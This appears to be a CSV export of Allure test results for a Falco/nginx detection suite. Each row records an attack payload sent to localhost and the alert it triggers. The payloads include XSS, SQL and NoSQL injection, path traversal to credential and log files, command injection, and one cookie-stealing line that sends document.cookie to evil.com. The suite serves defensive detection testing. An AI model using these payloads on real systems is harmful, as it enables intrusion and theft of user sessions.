"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_002` |
| **Name** | Image onerror XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<img src=x onerror=alert('XSS')>`
- **Encoded**: `%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 14:58:59.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_002-1765465139384-w5kpf3 pattern_id=XSS_REFL_002 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:58:59.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_002-1765465139384-w5kpf3 pattern_id=XSS_REFL_002 uri=/?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[037_XSS_REFL_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_003` |
| **Name** | SVG onload XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<svg onload=alert('XSS')>`
- **Encoded**: `%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~19000ms
- **Timestamp**: 14:58:59.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_003-1765465139887-ehnx1 pattern_id=XSS_REFL_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:58:59.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_003-1765465139887-ehnx1 pattern_id=XSS_REFL_003 uri=/?q=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[038_XSS_REFL_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_008` |
| **Name** | Root bash history access |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `../../../../root/.bash_history`
- **Encoded**: `../../../../root/.bash_history`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~9000ms
- **Timestamp**: 14:59:09.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1765465149897-p6j7k6 pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1

**Falco Log Entry**:
```
14:59:09.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_008-1765465149897-p6j7k6 pattern_id=PATH_DOT_008 uri=/?q=../../../../root/.bash_history client=127.0.0.1
```","1","test_e2e_with_logs[068_PATH_DOT_008]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_004` |
| **Name** | Authentication log access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/var/log/auth.log`
- **Encoded**: `/var/log/auth.log`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~6000ms
- **Timestamp**: 14:59:12.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1765465152906-vhelj pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1

**Falco Log Entry**:
```
14:59:12.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_004-1765465152906-vhelj pattern_id=PATH_ABS_004 uri=/?q=/var/log/auth.log client=127.0.0.1
```","1","test_e2e_with_logs[054_PATH_ABS_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `EMRG_MONGO_004` |
| **Name** | MongoDB regex wildcard injection |
| **Category** | OTHER |
| **Subcategory** | mongodb_injection |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `{""$regex"": "".*""}`
- **Encoded**: `%7B%22%24regex%22%3A%20%22.%2A%22%7D`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~3000ms
- **Timestamp**: 14:59:15.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_004-1765465155387-47lzw4 pattern_id=EMRG_MONGO_004 uri=/?q=%7B%22%24regex%22%3A%20%22.%2A%22%7D client=127.0.0.1

**Falco Log Entry**:
```
14:59:15.000000000: Critical [NGINX Emerging Threat] MongoDB NoSQL injection test_id=EMRG_MONGO_004-1765465155387-47lzw4 pattern_id=EMRG_MONGO_004 uri=/?q=%7B%22%24regex%22%3A%20%22.%2A%22%7D client=127.0.0.1
```","1","test_e2e_with_logs[099_EMRG_MONGO_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_002` |
| **Name** | MySQL BENCHMARK function |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `BENCHMARK(1000000,MD5('test'))`
- **Encoded**: `BENCHMARK%281000000%2CMD5%28%27test%27%29%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 14:58:54.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_002-1765465134383-tcfzg6 pattern_id=SQLI_TIME_002 uri=/?q=BENCHMARK%281000000%2CMD5%28%27test%27%29%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:58:54.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_002-1765465134383-tcfzg6 pattern_id=SQLI_TIME_002 uri=/?q=BENCHMARK%281000000%2CMD5%28%27test%27%29%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[011_SQLI_TIME_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_001` |
| **Name** | Basic script tag XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<script>alert('XSS')</script>`
- **Encoded**: `%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 14:58:58.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1765465138882-2qrx4r pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:58:58.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_REFL_001-1765465138882-2qrx4r pattern_id=XSS_REFL_001 uri=/?q=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[036_XSS_REFL_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_BASIC_003` |
| **Name** | Triple parent directory traversal |
| **Category** | PATH |
| **Subcategory** | basic_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../`
- **Encoded**: `../../../`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 14:59:04.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1765465144885-5zb32f pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1

**Falco Log Entry**:
```
14:59:04.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_BASIC_003-1765465144885-5zb32f pattern_id=PATH_BASIC_003 uri=/?q=../../../ client=127.0.0.1
```","1","test_e2e_with_logs[058_PATH_BASIC_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_003` |
| **Name** | eval() code injection |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `eval('alert(document.domain)')`
- **Encoded**: `eval('alert(document.domain)')`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~10000ms
- **Timestamp**: 14:59:08.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] Advanced XSS Attack Attempt test_id=XSS_DOM_003-1765465148910-c3qmf pattern_id=XSS_DOM_003 uri=/?q=eval('alert(document.domain)') client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:59:08.000000000: Warning [NGINX XSS] Advanced XSS Attack Attempt test_id=XSS_DOM_003-1765465148910-c3qmf pattern_id=XSS_DOM_003 uri=/?q=eval('alert(document.domain)') client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[032_XSS_DOM_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ENC_002` |
| **Name** | Unicode escaped script tag |
| **Category** | XSS |
| **Subcategory** | encoding_bypass |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `\u003cscript\u003ealert(1)\u003c/script\u003e`
- **Encoded**: `%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~12000ms
- **Timestamp**: 14:59:06.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1765465146904-oisn5i pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:59:06.000000000: Warning [NGINX XSS] XSS Filter Bypass Attempt test_id=XSS_ENC_002-1765465146904-oisn5i pattern_id=XSS_ENC_002 uri=/?q=%5Cu003cscript%5Cu003ealert(1)%5Cu003c%2Fscript%5Cu003e client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[034_XSS_ENC_002]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BOOL_005` |
| **Name** | Double quote boolean injection |
| **Category** | SQLI |
| **Subcategory** | boolean_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `"" OR ""1""=""1`
- **Encoded**: `%22%20OR%20%221%22%3D%221`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 14:59:04.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1765465144912-j6fw3 pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:59:04.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BOOL_005-1765465144912-j6fw3 pattern_id=SQLI_BOOL_005 uri=/?q=%22%20OR%20%221%22%3D%221 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[005_SQLI_BOOL_005]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ENC_001` |
| **Name** | URL encoded dot-dot-slash |
| **Category** | PATH |
| **Subcategory** | encoded_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%2e%2e%2fetc/passwd`
- **Encoded**: `%252e%252e%252fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~5000ms
- **Timestamp**: 14:59:13.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_001-1765465153909-rgy5nh pattern_id=PATH_ENC_001 uri=/?q=%252e%252e%252fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:59:13.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_001-1765465153909-rgy5nh pattern_id=PATH_ENC_001 uri=/?q=%252e%252e%252fetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[071_PATH_ENC_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_001` |
| **Name** | document.location manipulation |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~11000ms
- **Timestamp**: 14:59:07.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1765465147907-c8snum pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:59:07.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1765465147907-c8snum pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[030_XSS_DOM_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_007` |
| **Name** | Network information gathering |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&& netstat -an`
- **Encoded**: `%26%26%20netstat%20-an`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~7000ms
- **Timestamp**: 14:59:11.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1765465151891-amdpr pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1

**Falco Log Entry**:
```
14:59:11.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASIC_007-1765465151891-amdpr pattern_id=CMD_BASIC_007 uri=/?q=%26%26%20netstat%20-an client=127.0.0.1
```","1","test_e2e_with_logs[081_CMD_BASIC_007]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_012` |
| **Name** | Double pipe OR operator |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `||ls`
- **Encoded**: `%7C%7Cls`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~4000ms
- **Timestamp**: 14:59:14.000 UTC

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_012-1765465154397-nt6ol pattern_id=CMD_BASIC_012 uri=/?q=%7C%7Cls client=127.0.0.1

**Falco Log Entry**:
```
14:59:14.000000000: Critical [NGINX CMDi] Command injection via pipe test_id=CMD_BASIC_012-1765465154397-nt6ol pattern_id=CMD_BASIC_012 uri=/?q=%7C%7Cls client=127.0.0.1
```","1","test_e2e_with_logs[086_CMD_BASIC_012]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_UNICODE_001` |
| **Name** | Unicode slash encoding |
| **Category** | PATH |
| **Subcategory** | unicode_encoding |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..%c0%afetc/passwd`
- **Encoded**: `..%25c0%25afetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~3000ms
- **Timestamp**: 14:59:15.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1765465155415-mbg4an pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:59:15.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_UNICODE_001-1765465155415-mbg4an pattern_id=PATH_UNICODE_001 uri=/?q=..%25c0%25afetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[074_PATH_UNICODE_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_004` |
| **Name** | Iframe javascript scheme XSS |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<iframe src=javascript:alert('XSS')>`
- **Encoded**: `%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~18000ms
- **Timestamp**: 14:59:00.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_004-1765465140388-mqakw pattern_id=XSS_REFL_004 uri=/?q=%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:59:00.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_004-1765465140388-mqakw pattern_id=XSS_REFL_004 uri=/?q=%3Ciframe%20src%3Djavascript%3Aalert%28%27XSS%27%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[039_XSS_REFL_004]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_001` |
| **Name** | Basic MySQL SLEEP function |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP(5)`
- **Encoded**: `SLEEP%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~25000ms
- **Timestamp**: 14:58:53.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_001-1765465133881-kcds0c pattern_id=SQLI_TIME_001 uri=/?q=SLEEP%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:58:53.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_001-1765465133881-kcds0c pattern_id=SQLI_TIME_001 uri=/?q=SLEEP%285%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[010_SQLI_TIME_001]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_003` |
| **Name** | Hosts file access via path traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/hosts`
- **Encoded**: `../../../etc/hosts`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~11000ms
- **Timestamp**: 14:59:07.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1765465147391-ldnmv5 pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1

**Falco Log Entry**:
```
14:59:07.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_003-1765465147391-ldnmv5 pattern_id=PATH_DOT_003 uri=/?q=../../../etc/hosts client=127.0.0.1
```","1","test_e2e_with_logs[063_PATH_DOT_003]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_REFL_013` |
| **Name** | onmouseover event handler injection |
| **Category** | XSS |
| **Subcategory** | reflected_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<a onmouseover=alert(1)>hover</a>`
- **Encoded**: `%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~14000ms
- **Timestamp**: 14:59:04.000 UTC

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1765465144900-rs1n9 pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:59:04.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_REFL_013-1765465144900-rs1n9 pattern_id=XSS_REFL_013 uri=/?q=%3Ca%20onmouseover%3Dalert(1)%3Ehover%3C%2Fa%3E client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[048_XSS_REFL_013]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_DOT_007` |
| **Name** | Kernel version access via traversal |
| **Category** | PATH |
| **Subcategory** | dot_dot_slash |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `../../../proc/version`
- **Encoded**: `../../../proc/version`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~9000ms
- **Timestamp**: 14:59:09.000 UTC

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_007-1765465149396-ltrxib pattern_id=PATH_DOT_007 uri=/?q=../../../proc/version client=127.0.0.1

**Falco Log Entry**:
```
14:59:09.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_DOT_007-1765465149396-ltrxib pattern_id=PATH_DOT_007 uri=/?q=../../../proc/version client=127.0.0.1
```","1","test_e2e_with_logs[067_PATH_DOT_007]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_011` |
| **Name** | Lowercase sleep function |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `sleep(5)`
- **Encoded**: `sleep%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 14:58:58.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_011-1765465138898-ymqwi8 pattern_id=SQLI_TIME_011 uri=/?q=sleep%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:58:58.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_011-1765465138898-ymqwi8 pattern_id=SQLI_TIME_011 uri=/?q=sleep%285%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[020_SQLI_TIME_011]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_015` |
| **Name** | Sleep with comment obfuscation |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/**/SLEEP/**/(5)`
- **Encoded**: `/%2A%2A/SLEEP/%2A%2A/%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~18000ms
- **Timestamp**: 14:59:00.000 UTC

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_015-1765465140903-s58lfh pattern_id=SQLI_TIME_015 uri=/?q=/%2A%2A/SLEEP/%2A%2A/%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:59:00.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_015-1765465140903-s58lfh pattern_id=SQLI_TIME_015 uri=/?q=/%2A%2A/SLEEP/%2A%2A/%285%29 client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[024_SQLI_TIME_015]","allure","2025-12-11","passed","2025-12-11","","test_e2e_wrapper","",""
